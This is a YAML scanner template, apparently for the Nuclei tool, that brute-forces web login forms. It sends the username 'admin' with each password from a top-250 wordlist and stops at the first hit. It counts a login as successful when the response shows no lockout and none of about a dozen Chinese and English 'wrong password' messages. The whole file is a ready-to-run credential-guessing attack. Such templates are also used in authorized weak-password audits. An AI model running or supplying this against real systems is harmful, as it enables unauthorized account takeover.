id: fuzzing-loginpage-weak-password-form-login-username-password

info:
  name: fuzzing-loginpage-weak-password-form-login-username-password
  author: capiton
  severity: high

requests:
  - raw:
      - |-
        POST /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {{user_param}}={{username}}&{{pass_param}}={{password}}

    
    payloads:
      username:
        - admin

      password: "0.local/helpers/wordlists/password-TOP250"


    attack: clusterbomb
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        condition: or
        negative: true
        words:
          - "帐户锁定"
          - "未知错误"
          - "账户封禁"


      - type: word
        condition: or
        words:
          - "用户名密码错误"
          - "用户名或密码错误"
          - "用户或密码错误"
          - "密码错误"
          - "密码不对"
          - "用户不存在/密码错误"
          - "登陆失败, 账号或密码错误"
          - "login fail"
          - "password error"
          - "用户名或密码无效"
          - "用户名或密码不正确"
          - "无效的用户名或密码"
          - "不合法的账号密码"
          - "登录失败，请重试"
        negative: true
